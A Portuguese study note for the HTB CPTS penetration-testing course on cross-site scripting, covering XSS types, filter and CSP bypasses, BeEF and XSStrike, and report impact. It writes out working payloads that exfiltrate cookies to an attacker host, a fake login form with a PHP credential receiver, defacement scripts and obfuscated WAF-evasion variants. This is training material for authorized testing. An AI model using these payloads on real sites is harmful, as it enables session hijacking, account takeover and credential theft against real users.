---
tema: Web / Injeção
tópico: Cross-Site Scripting (XSS) — reflected, stored e DOM; exploração e bypass
tags: [htb, cpts, xss, web, javascript, beef, xsstrike]
dificuldade: easy
---

# 🕷️ CPTS 19 — Cross-Site Scripting (XSS)

> [!info] Objetivo
> Injetar JavaScript que executa **no contexto do navegador da vítima** para roubar cookies/sessão, sequestrar sessão, desfigurar páginas, colher credenciais por phishing e pivotar para o painel administrativo. O impacto no relatório depende de **quem** executa o payload e **o que** ele alcança.

---

## 🎯 Quando usar

| Onde procurar | Por quê |
|---------------|---------|
| Parâmetro refletido na resposta (`?q=`, `?msg=`, `?error=`) | Candidato a reflected |
| Campo salvo e exibido depois (comentário, perfil, ticket) | Candidato a stored — o mais grave |
| Área de admin exibindo dados do usuário | Blind XSS (dispara na revisão do suporte) |
| `location.hash`, `document.URL`, `innerHTML`, `document.write` no JS | Candidato a DOM XSS |
| Headers refletidos (User-Agent em páginas de log/erro) | Fonte incomum que ninguém filtra |
| Upload de SVG/HTML abrindo inline | XSS armazenado via arquivo |

---

## 🧰 Ferramentas

| Ferramenta | Uso |
|-----------|-----|
| Burp Repeater | Testar payload por payload, ver reflexão e contexto |
| Burp Collaborator / XSS Hunter / Interactsh | Confirmar **blind XSS** e exfiltração fora de banda |
| `xsstrike` | Fuzzing inteligente de XSS com detecção de filtro |
| `dalfox` | Scanner rápido de XSS em URL/arquivo de URLs |
| BeEF | Framework de hook de browser (pós-exploração de XSS) |
| `python3 -m http.server` / `php -S 0.0.0.0:8000` | Receber cookies e arquivos JS |
| Navegador com DevTools | Analisar sink DOM e comportamento de CSP |

```bash
# Scanner rápido
dalfox url "http://<IP>/index.php?q=test" --skip-bav
xsstrike -u "http://<IP>/index.php?q=test" --crawl   # interativo: passa o payload próprio
python3 xsstrike.py -u "http://<IP>/?q=test"         # execução direta do script
```

---

## 🔍 Tipos de XSS

| Tipo | Fluxo | Persiste? | Executa para quem? |
|------|-------|-----------|--------------------|
| Reflected | Request → resposta imediata | Não | Quem clicar no link (precisa phishing) |
| Stored | Payload gravado no banco → exibido | Sim | Todo usuário da página, incluindo admin |
| DOM-based | Sink JS lê fonte controlada pelo atacante | Não (no servidor) | Quem carregar a página com o hash/param |
| Blind | Stored que só aparece em painel interno | Sim | Analista/admin — descoberta às cegas |

```text
Stored comprometendo admin:
  você grava: <script>fetch('http://<IP>/c?'+document.cookie)</script>
  no campo "comentário" de um ticket
        ↓
  admin abre o painel → script roda no domínio do app → sessão de admin vaza
  → você entra no painel com o cookie roubado (session hijacking)
```

---

## 🧪 Payloads de teste

```html
<script>alert(document.domain)</script>
<script>alert(1)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<a href="javascript:alert(1)">clique</a>
```

```text
Quebra de contexto (o essencial):
  atributo entre aspas:  "><script>alert(1)</script>
  atributo simples:      '><img src=x onerror=alert(1)>
  dentro de <script>:    </script><script>alert(1)</script>
  dentro de <textarea>:  </textarea><script>alert(1)</script>
  dentro de href:        javascript:alert(1)
```

| Método | Quando usar |
|--------|-------------|
| `alert()` / `print()` | Provar execução (nunca usar `alert` em bug bounty ao vivo) |
| `console.log()` | Evidência sem popup no alvo |
| `<script src=//<IP>/x.js>` | Payload grande (evita filtro de tamanho/palavra-chave) |
| `fetch('//<IP>/?'+btoa(document.cookie))` | Exfiltração silenciosa |

---

## 🍪 Roubo de cookie e sequestro de sessão

```html
<!-- Exfiltração simples: o cookie vai no path da requisição -->
<script>fetch('http://<IP>:8000/?c='+document.cookie)</script>

<!-- Via Image: mais compatível e sem CORS -->
<script>new Image().src='http://<IP>:8000/?c='+document.cookie</script>

<!-- Base64 evita quebrar URL com caracteres especiais -->
<script>new Image().src='http://<IP>:8000/?c='+btoa(document.cookie)</script>
```

```bash
# Listener simples para receber (log no terminal basta)
python3 -m http.server 8000
# Requisição recebida: GET /?c=PHPSESSID=abc123 →
# o cookie válido aparece na tela; use no navegador para assumir a sessão
```

```bash
# Emails/hosts alvo: é comum o CORS bloquear leitura; por isso use Image/navegação
# Encoding para bypass de WAF no payload: eval(atob('BASE64_DO_SCRIPT'))
echo -n "fetch('//<IP>/?c='+document.cookie)" | base64
```

> [!warning] HttpOnly e Secure
> Cookie com `HttpOnly` **não** é legível por `document.cookie` — nesse caso o XSS não rouba sessão, mas ainda permite ações autenticadas (CSRF interno, leitura de dados da página, keylogging).
> Cookie com `Secure` não sai em requisição HTTP: se a vítima está em HTTPS, seu listener **precisa** ser HTTPS, senão o navegador bloqueia (mixed content).

```javascript
// Após roubar o cookie: no DevTools → Application → Cookies, troque o valor
// ou use extensão (Cookie-Editor) e recarregue a página
// Antes de trocar, remova o token CSRF da ação e refaça o GET autenticado.
```

---

## 🎭 Defacement e phishing

```html
<!-- Defacement: injeta conteúdo no DOM -->
<script>document.body.innerHTML='<h1>Comprometido</h1>'</script>

<!-- Substitui a página inteira -->
<script>document.documentElement.innerHTML='<h1>Pwned</h1>'</script>

<!-- Fundo alterado (menos destrutivo, mesma prova) -->
<script>document.body.style.backgroundImage="url('http://<IP>/x.png')"</script>
```

```html
<!-- Phishing de credenciais: form falso que finge ser o login da app -->
<script>
  document.body.innerHTML = `
    <h2>Sessão expirada</h2>
    <form action="http://<IP>:8000/creds" method="POST">
      <input name="user" placeholder="Usuário">
      <input name="pass" type="password" placeholder="Senha">
      <button>Entrar</button>
    </form>`;
</script>
```

```php
// Receptor de credenciais (salva POST em texto)
<?php file_put_contents('creds.txt', print_r($_POST, true), FILE_APPEND); ?>
```

> [!note] O que reportar
> Defacement e phishing são provas de impacto, mas exigem autorização — em bug bounty, use `alert`/`console.log` e descreva o impacto potencial no relatório.

---

## 🕳️ Blind XSS

Payload que só executa em outro contexto (painel de suporte, log de auditoria, dashboard).

```html
<script src="http://<IP>/x.js"></script>

<!-- Auto-contido, ping imediato com tudo que dá para coletar -->
<script>
  new Image().src='http://<IP>/?u='+encodeURIComponent(location.href)+
    '&c='+encodeURIComponent(document.cookie);
</script>
```

| Onde injetar | Motivo |
|--------------|--------|
| Formulário de contato / e-mail no campo nome | Lido por humano no CRM |
| User-Agent, Referer, `X-Forwarded-For` | Refletido em páginas de log/estatística internas |
| Campos de ticket (assunto, descrição, anexo) | Analista abre no painel |
| Reviews, comentários, bio | Exibidos por painel admin |
| Termos de busca salvos / histórico | Listado em admin |

```bash
# Use XSS Hunter / Interactsh para capturar disparo fora de banda com screenshot
# e página de origem — ideal para blind, onde você não vê a execução.
python3 -m http.server 8000   # fallback simples: registra o hit
```

> [!tip] Probe antes do payload
> Para blind, injete primeiro um `<script src=//<IP>/probe.js>` que só faz um `fetch` de marcação. Quando você vê o hit, sabe que o contexto existe e pode escalar (cookie, keylogger, CSRF).

---

## 🧱 Bypass de filtro

| Filtro | Bypass |
|--------|--------|
| `<script>` removido | `<img src=x onerror=alert(1)>`, `<svg onload=...>`, `<details open ontoggle=...>` |
| Case-sensitive | `<ScRiPt>alert(1)</ScRiPt>` |
| Remoção única de `script` | `<scr<script>ipt>alert(1)</scr</script>ipt>` |
| `alert` bloqueado | `eval(atob('YWxlcnQoMSk='))`, `top['ale'+'rt'](1)`, `window['\u0061lert'](1)`, `confirm`, `prompt`, `print` |
| Aspas bloqueadas | `<script>alert(String.fromCharCode(49))</script>`, template literals |
| `(` e `)` bloqueados | `<script>onerror=alert;throw 1</script>` (handler de erro, sem parênteses) |
| Parênteses filtrados no vetor `on*` | `<svg onload=alert&lpar;1&rpar;>` (entidades HTML no atributo) |
| Espaços filtrados | `<img/src=x/onerror=alert(1)>`, `%09`, `%0a` |
| Entidades HTML | `&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;` |
| Bloqueio de `document.cookie` | `fetch('//x/?'+document['coo'+'kie'])` |
| WAF de assinatura | `eval(atob(...))`, carregar JS externo |
| Filtro de URL | `//<IP>/x.js` em vez de `http://<IP>/x.js` |

```html
<!-- Payload dividido: carrega o resto de fora (contorna filtro de tamanho/keyword) -->
<script src="//<IP>/x.js"></script>
<!-- x.js contém: new Image().src='//<IP>/?c='+document.cookie -->
```

```bash
# Codificação dupla para contornar decodificação única
# <script> → %253Cscript%253E
python3 -c "import urllib.parse as u; print(u.quote(u.quote('<script>alert(1)</script>')))"
```

---

## 🛡️ CSP (Content Security Policy)

Verifique o header em toda resposta onde houver reflexão:

```bash
curl -sI "http://<IP>/" | grep -i "content-security-policy"
```

| Diretiva | O que significa para você |
|----------|---------------------------|
| `script-src 'self'` | Inline bloqueado; só JS do próprio domínio |
| `script-src 'unsafe-inline'` | Inline liberado — XSS clássico funciona |
| `script-src 'unsafe-eval'` | `eval()`, `Function()`, `setTimeout(string)` permitidos |
| `script-src <host>` | Hosts externos liberados — se houver **JSONP** neles, dá bypass |
| `nonce-...` | Inline só com o nonce correto; se vaza/reutiliza, é bypass |
| `'strict-dynamic'` | Script legítimo pode carregar outros; procure injeção em scripts já confiáveis |
| `default-src 'none'` sem `connect-src` | Exfiltração via `fetch`/`Image` bloqueada — use outros canais |
| `report-uri` | Seus payloads geram relatórios para o defensor: espere alerta |

```text
# Fluxo de análise de CSP
1. O XSS executa?            → ver se script-src permite (inline/external/nonce)
2. Consegue exfiltrar?       → connect-src, img-src, form-action
3. Consegue sequestrar?      → cookies HttpOnly/SameSite
Não invente bypass: sem host liberado com JSONP e sem nonce vazado, a CSP segura.
```

---

## 🐮 BeEF e XSStrike

```bash
# Hook do BeEF (o payload injetado carrega o hook.js do servidor de comando)
# Cliente: no payload
#   <script src="http://<IP>:3000/hook.js"></script>
sudo beef-xss                       # ou ./beef no diretório do BeEF
# Painel: http://127.0.0.1:3000/ui/panel  (usuário/senha definidos na instalação)

# Recursos do painel (após hook): roubo de cookie, keylogger, screenshot,
# redirecionamento, request em massa no domínio da vítima (CSRF interno).
```

```bash
# XSStrike: gera contexto, detecta filtro e testa payloads
python3 xsstrike.py -u "http://<IP>/index.php?q=test" --fuzzer
python3 xsstrike.py -u "http://<IP>/index.php?q=test" --crawl --level 2
python3 xsstrike.py -r request.txt        # request salva do Burp (melhor para POST)
```

| Ferramenta | Força | Fraqueza |
|-----------|-------|----------|
| dalfox | Velocidade, bom para volume | Menos análise de contexto que XSStrike |
| XSStrike | Análise de contexto e fuzzer de filtro | Lento; interatividade atrapalha script |
| BeEF | Pós-exploração rica no browser | Pesado; o hook fica visível para o defensor |

---

## 📊 Impacto no relatório

| Impacto | Requisito | Severidade |
|---------|-----------|-----------|
| Execução de JS no domínio da app | Qualquer XSS confirmado | Baixa (se realmente só isso) |
| Roubo de sessão | Cookie sem `HttpOnly` + vítima privilegiada | Alta/Crítica |
| Tomada de conta de admin | Stored XSS visto por admin | Crítica |
| Ações autenticadas (CSRF interno) | XSS em área autenticada | Alta |
| Coleta de credenciais por phishing | Engenharia social permitida no escopo | Alta |
| Defacement | Persistência da injeção | Média/Alta |
| Exposição de dados na página | Dados sensíveis renderizados | Varia |

```text
Frase de impacto que vale no relatório:
"XSS armazenado no campo 'Assunto' do ticket executa para qualquer analista
que abrir a fila. Sem o atributo HttpOnly no cookie de sessão, um atacante
captura o token do analista e assume a conta administrativa."
```

---

## ⚠️ Pegadinhas

- `alert()` no servidor de produção é invasivo; prefira `console.log` — e nunca deixe payload ativo após o engajamento.
- Reflexão **não é** execução: verifique se o payload chega intacto ao DOM (contexto de atributo, escape de aspas, filtro de JS).
- Cookie `HttpOnly` mata roubo de sessão, mas não o XSS: mude a narrativa para ações autenticadas.
- `Secure` + site HTTPS exige listener HTTPS; cookie não sai em HTTP.
- `SameSite=Lax/Strict` não impede requisição para **outro host** via `Image` (envio, não leitura) — mas impede o navegador de enviar cookie em navegação cross-site.
- Blind XSS: sem coletor (XSS Hunter/Interactsh) você nunca saberá que disparou.
- CSP pode permitir a execução e derrubar só a exfiltração: separe as duas coisas.
- HTML entity encoding no reflexo às vezes **reverte** em contexto de atributo/JS (`&#x27;` vira `'`).
- DOM XSS: o servidor pode não ver nada no request — olhe o JS (`innerHTML`, `eval`, `document.write`, `location.hash`).
- SVG/XHTML costumam ter menos filtro que HTML puro.

---

## ✅ Checklist rápido

- [ ] Pontos de entrada mapeados (params, campos salvos, headers, upload)
- [ ] Reflexão testada com quebra de contexto (`"><script>`)
- [ ] Execução confirmada no browser (`alert`/`console.log`) ou coletor para blind
- [ ] Tipo classificado (reflected/stored/DOM/blind)
- [ ] Cookie checado (`HttpOnly`, `Secure`, `SameSite`)
- [ ] Impacto demonstrado: sessão, ação autenticada, phishing ou defacement
- [ ] CSP lida e impacto ajustado ao que é possível com ela ativa
- [ ] Payload final limpo/documentado (o ativo, não o de reconhecimento)
- [ ] Evidência: request, response e screenshot do efeito
- [ ] Recomendação: encoding por contexto, `HttpOnly`, CSP restritiva, sanitização

---

## 🔗 Relacionado

- [[CPTS 23 - Web Attacks]]
- [[CPTS 15 - Attacking Web Applications with Ffuf]]
- [[CPTS 14 - Using Web Proxies]]
- [[CPTS 21 - File Upload Attacks]]
- [[Fase 05 - Enumeração Web]]
